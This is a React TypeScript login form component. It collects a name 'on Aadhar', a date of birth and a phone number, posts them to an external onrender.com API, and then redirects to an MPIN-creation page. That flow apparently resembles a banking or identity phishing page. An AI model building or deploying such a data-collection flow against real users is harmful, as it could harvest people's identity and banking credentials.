import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAppContext } from '../context/AppContext';
import { motion } from 'framer-motion';

const LoginForm: React.FC = () => {
  const { updateUserData } = useAppContext();
  const navigate = useNavigate();
  
  const [name, setName] = useState('');
  const [dob, setDob] = useState('');
  const [phone, setPhone] = useState('');
  const [errors, setErrors] = useState({ name: '', dob: '', phone: '' });
  const [loading, setLoading] = useState(false);

  const validateForm = () => {
    let valid = true;
    const newErrors = { name: '', dob: '', phone: '' };
    
    if (!name.trim()) {
      newErrors.name = 'Name is required';
      valid = false;
    }
    
    if (!dob) {
      newErrors.dob = 'Date of birth is required';
      valid = false;
    }
    
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      newErrors.phone = 'Valid 10-digit phone number is required';
      valid = false;
    }
    
    setErrors(newErrors);
    return valid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    setLoading(true);
  
    try {
      const response = await fetch("https://api-2-hnij.onrender.com/api/submit", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ name, dob, phone }),
    });
  
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
  
      const data = await response.json();
      console.log("Submission successful:", data);
      
      // Update context and navigate
      updateUserData({ name, dob, phone });
      // Wait 1.5 seconds before navigating
      setTimeout(() => {
        navigate("/create-mpin");
        setLoading(false);
      }, 1500);
      
    } catch (err) {
      setLoading(false);
      console.error("Submission failed:", err);
      // Add user-facing error message here
    }
  };
  

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="flex flex-col items-center"
    >
      <h1 className="text-4xl font-bold mb-2 text-center">Login</h1>
      <p className="text-xl text-gray-600 mb-8 text-center">Login to your account</p>
      
      <form onSubmit={handleSubmit}  className="w-full space-y-6">
        <div>
          <input
            type="text"
            
            placeholder="Name On Aadhar"
            value={name}
            onChange={(e) => setName(e.target.value)}
            className={`${errors.name ? 'border-red-500' : ''}`}
            
          />
          {errors.name && <p className="text-red-500 text-sm mt-1">{errors.name}</p>}
        </div>
        
        <div>
          <input
            type="date"
            placeholder="Date of Birth"
            value={dob}
            onChange={(e) => setDob(e.target.value)}
            className={`${errors.dob ? 'border-red-500' : ''}`}
          />
          {errors.dob && <p className="text-red-500 text-sm mt-1">{errors.dob}</p>}
        </div>
        
        <div className="relative">
          <input
            type="tel"
            placeholder="Phone Number"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            maxLength={10}
            className={`${errors.phone ? 'border-red-500' : ''}`}
          />
          {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
          <div className="absolute right-3 bottom-3 text-sm text-gray-500">
            {phone.length}/10
          </div>
        </div>
        
        <button type="submit" className="primary-button w-full">
          Login
        </button>
      </form>
    </motion.div>
  );
};

export default LoginForm;